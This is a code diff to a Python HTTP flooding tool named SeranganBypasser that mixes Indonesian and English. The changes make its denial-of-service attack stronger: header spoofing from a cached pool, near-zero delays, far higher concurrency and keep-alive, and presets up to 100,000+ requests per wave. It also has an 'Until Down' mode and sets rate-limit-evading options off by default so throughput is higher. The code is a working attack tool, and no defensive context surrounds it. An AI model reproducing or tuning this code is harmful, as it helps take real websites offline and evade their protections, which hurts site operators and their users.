@@ -40,6 +40,8 @@ class SeranganBypasser:
         self.console = Console()
         self.user_agents = self.load_user_agents()
         self.proxies = []
+        # Header cache for high performance
+        self.header_cache = [self.generate_realistic_headers() for _ in range(200)]
         
     def load_user_agents(self):
         """Database User-Agents untuk bypass detection"""
@@ -196,12 +198,17 @@ class SeranganBypasser:
             if method in ["POST", "PUT"] and config.get('enable_payloads'):
                 data = self.generate_bypass_payload(random.randint(1, 3))
             
-            # Generate realistic headers
-            headers = self.generate_realistic_headers()
+            # High performance header selection
+            if config.get('high_performance'):
+                headers = random.choice(self.header_cache)  # Fast header selection
+            else:
+                headers = self.generate_realistic_headers()  # Full generation
             
-            # Add random delays to mimic human behavior
-            if config.get('enable_human_simulation'):
-                await asyncio.sleep(random.uniform(0.1, 2.0))
+            # High performance mode: minimal delays
+            if config.get('high_performance'):
+                await asyncio.sleep(0.001)  # Minimal delay for high throughput
+            elif config.get('enable_human_simulation'):
+                await asyncio.sleep(random.uniform(0.01, 0.1))  # Reduced delay
             
             async with session.request(
                 method=method,
@@ -230,14 +237,14 @@ class SeranganBypasser:
     async def bypass_wave_attack(self, targets: List[str], config: dict) -> List[HasilSerangan]:
         """Execute wave attack dengan bypass techniques"""
         
-        # More aggressive connector settings
+        # Ultra aggressive connector settings for maximum throughput
         connector = aiohttp.TCPConnector(
-            limit=config['max_concurrent'],
-            limit_per_host=config['max_concurrent'] // len(targets),
-            use_dns_cache=False,  # Avoid DNS caching
+            limit=config['max_concurrent'] * 3,  # 3x multiplier for maximum connections
+            limit_per_host=config['max_concurrent'],  # Full concurrent per target
+            use_dns_cache=True,  # Use DNS cache for speed
             enable_cleanup_closed=True,
-            force_close=True,  # Force close connections - no keepalive needed
-            ttl_dns_cache=60,
+            force_close=False,  # Keep-alive for better performance
+            ttl_dns_cache=300,
             ssl=self.create_ssl_context()
         )
         
@@ -264,9 +271,12 @@ class SeranganBypasser:
                     hasil_wave.append(result)
                     return result
             
-            # Execute with smart batching
+            # Execute with optimized batching for high performance
             total_requests = config['request_per_wave']
-            batch_size = min(config['max_concurrent'], 1000)  # Smaller batches
+            if config.get('high_performance'):
+                batch_size = min(config['max_concurrent'] * 2, 5000)  # Larger batches for speed
+            else:
+                batch_size = min(config['max_concurrent'], 1000)  # Standard batches
             
             for i in range(0, total_requests, batch_size):
                 batch_tasks = []
@@ -282,15 +292,17 @@ class SeranganBypasser:
                 except Exception as e:
                     self.console.print(f"⚠️ Batch error (continuing): {e}")
                 
-                # Adaptive delay based on success rate
-                if config.get('enable_adaptive_delay'):
+                # High performance batch delay
+                if config.get('high_performance'):
+                    await asyncio.sleep(0.001)  # Almost no delay for max speed
+                elif config.get('enable_adaptive_delay'):
                     recent_errors = len([r for r in hasil_wave[-100:] if r.kode_status != 200])
                     if recent_errors > 80:  # High error rate
-                        await asyncio.sleep(random.uniform(1, 3))
+                        await asyncio.sleep(random.uniform(0.1, 0.3))  # Reduced delay
                     elif recent_errors > 50:
-                        await asyncio.sleep(random.uniform(0.5, 1.5))
+                        await asyncio.sleep(random.uniform(0.05, 0.15))  # Reduced delay
                     else:
-                        await asyncio.sleep(random.uniform(0.1, 0.5))
+                        await asyncio.sleep(random.uniform(0.001, 0.05))  # Minimal delay
         
         return hasil_wave
 
@@ -319,28 +331,29 @@ class SeranganBypasser:
                 targets = ["https://example.com"]
 
         # Attack intensity
-        self.console.print("\n⚡ [bold yellow]Bypass Intensity:[/bold yellow]")
-        self.console.print("1. Stealth (1000 req/wave, slow)")
-        self.console.print("2. Balanced (5000 req/wave)")
-        self.console.print("3. Aggressive (15000 req/wave)")
-        self.console.print("4. NUCLEAR (30000 req/wave)")
-        self.console.print("5. APOCALYPSE (50000+ req/wave)")
+        self.console.print("\n⚡ [bold yellow]High Performance Intensity:[/bold yellow]")
+        self.console.print("1. Stealth (5000 req/wave)")
+        self.console.print("2. Balanced (15000 req/wave)")
+        self.console.print("3. Aggressive (40000 req/wave)")
+        self.console.print("4. NUCLEAR (75000 req/wave)")
+        self.console.print("5. APOCALYPSE (100000+ req/wave)")
         
         intensity = Prompt.ask("Pilih intensity", choices=["1","2","3","4","5"], default="3")
         intensitas_map = {
-            "1": (1000, 20),
-            "2": (5000, 50), 
-            "3": (15000, 150),
-            "4": (30000, 300),
-            "5": (75000, 500)
+            "1": (5000, 100),    # Increased from 1000->5000
+            "2": (15000, 300),   # Increased from 5000->15000
+            "3": (40000, 800),   # Increased from 15000->40000
+            "4": (75000, 1500),  # Increased from 30000->75000
+            "5": (100000, 2000)  # Increased from 75000->100000
         }
         request_per_wave, max_concurrent = intensitas_map[intensity]
         
-        # Bypass features
+        # Enhanced bypass features
         enable_method_mix = Confirm.ask("🔀 [bold blue]Enable method mixing (GET/POST/PUT)?[/bold blue]", default=True)
         enable_payloads = Confirm.ask("📤 [bold blue]Enable realistic payloads?[/bold blue]", default=True)
-        enable_human_simulation = Confirm.ask("🤖 [bold blue]Enable human behavior simulation?[/bold blue]", default=True)
-        enable_adaptive_delay = Confirm.ask("⚡ [bold blue]Enable adaptive delay (smart rate limiting)?[/bold blue]", default=True)
+        enable_human_simulation = Confirm.ask("🤖 [bold blue]Enable human behavior simulation?[/bold blue]", default=False)  # Default false for speed
+        enable_adaptive_delay = Confirm.ask("⚡ [bold blue]Enable adaptive delay (smart rate limiting)?[/bold blue]", default=False)  # Default false for speed
+        high_performance = Confirm.ask("🚀 [bold red]Enable HIGH PERFORMANCE mode?[/bold red] (max throughput)", default=True)
         
         # Duration settings
         duration_mode = Prompt.ask("⏰ [bold cyan]Duration mode[/bold cyan] (1=Until Down, 2=Time Limit)", 
@@ -362,6 +375,7 @@ class SeranganBypasser:
             'enable_payloads': enable_payloads,
             'enable_human_simulation': enable_human_simulation,
             'enable_adaptive_delay': enable_adaptive_delay,
+            'high_performance': high_performance,
             'time_limit': time_limit,
             'error_threshold': error_threshold
         }
@@ -480,19 +494,21 @@ class SeranganBypasser:
                     self.console.print("\n⏰ [bold yellow]Time limit reached![/bold yellow]")
                     break
                 
-                # Adaptive wave delay
-                if config.get('enable_adaptive_delay') and hasil_wave:
+                # High performance mode: minimal delay
+                if config.get('high_performance'):
+                    await asyncio.sleep(0.1)  # Minimal delay for maximum throughput
+                elif config.get('enable_adaptive_delay') and hasil_wave:
                     recent_blocks = len([r for r in hasil_wave if r.kode_status in [403, 429, 503]])
                     block_rate = (recent_blocks / len(hasil_wave)) * 100
                     
-                    if block_rate > 70:
-                        await asyncio.sleep(random.uniform(10, 30))  # High detection, wait longer
-                    elif block_rate > 40:
-                        await asyncio.sleep(random.uniform(5, 15))
+                    if block_rate > 90:  # Only delay if almost all blocked
+                        await asyncio.sleep(random.uniform(1, 3))
+                    elif block_rate > 70:
+                        await asyncio.sleep(random.uniform(0.2, 0.5))
                     else:
-                        await asyncio.sleep(random.uniform(1, 5))    # Low detection, proceed quickly
+                        await asyncio.sleep(0.05)  # Minimal delay
                 else:
-                    await asyncio.sleep(2)
+                    await asyncio.sleep(0.5)  # Reduced from 2 seconds
                     
         except KeyboardInterrupt:
             self.console.print("\n🛑 [bold red]BYPASS ASSAULT TERMINATED![/bold red]")
